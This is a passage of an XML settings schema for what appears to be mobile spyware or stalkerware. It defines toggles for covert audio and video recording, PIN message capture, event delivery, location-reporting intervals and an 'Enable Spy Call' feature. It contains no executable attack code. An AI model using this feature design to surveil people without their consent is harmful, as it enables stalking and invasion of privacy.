                      <argument name="Enable audio recording" type="Choice">
                        <choiceitem label="Enable">1</choiceitem>
                        <choiceitem label="Disable">0</choiceitem>
                      </argument>
                    </setting>
                    <setting id="13" name="Video">
                      <argument name="Enable video capture" type="Choice">
                        <choiceitem label="Enable">1</choiceitem>
                        <choiceitem label="Disable">0</choiceitem>
                      </argument>
                    </setting>
                    <setting id="14" name="PIN">
                      <argument name="Enable PIN message capture" type="Choice">
                        <choiceitem label="Enable">1</choiceitem>
                        <choiceitem label="Disable">0</choiceitem>
                      </argument>
                    </setting>
                    <setting id="41" name="Event" associatedCommandIds="60">
                      <argument name="Enable event capture" type="Choice">
                        <choiceitem label="Enable">1</choiceitem>
                        <choiceitem label="Disable">0</choiceitem>
                      </argument>
                    </setting>
                    <setting id="42" name="Delivery Timer">
                      <argument name="Set capture timer" type="Integer" label="Delivery Timer" min="0" max="24" />
                    </setting>
                    <setting id="43" name="Maximum Event Count">
                      <argument name="Set event count" type="Integer" label="Maximum Event Count" min="1" max="500" />
                    </setting>
                    <setting id="44" name="Watch Status" associatedCommandIds="49">
                      <argument name="Enable watch" type="Choice">
                        <choiceitem label="Enable">1</choiceitem>
                        <choiceitem label="Disable">0</choiceitem>
                      </argument>
                    </setting>
                    <setting id="46" name="Timer" associatedCommandIds="53">
                      <argument name="Set Location timer" type="Choice">
                        <choiceitem label="10 Seconds">1</choiceitem>
                        <choiceitem label="30 Seconds">2</choiceitem>
                        <choiceitem label="1 Minute">3</choiceitem>
                        <choiceitem label="5 Minutes">4</choiceitem>
                        <choiceitem label="10 Minutes">5</choiceitem>
                        <choiceitem label="20 Minutes">6</choiceitem>
                        <choiceitem label="40 Minutes">7</choiceitem>
                        <choiceitem label="1 Hour">8</choiceitem>
                      </argument>
                    </setting>
                    <setting id="53" name="Enable Spy Call">
                      <argument name="Enable Spy Call" type="Choice">
                        <choiceitem label="Enable">1</choiceitem>
                        <choiceitem label="Disable">0</choiceitem>
                      </argument>
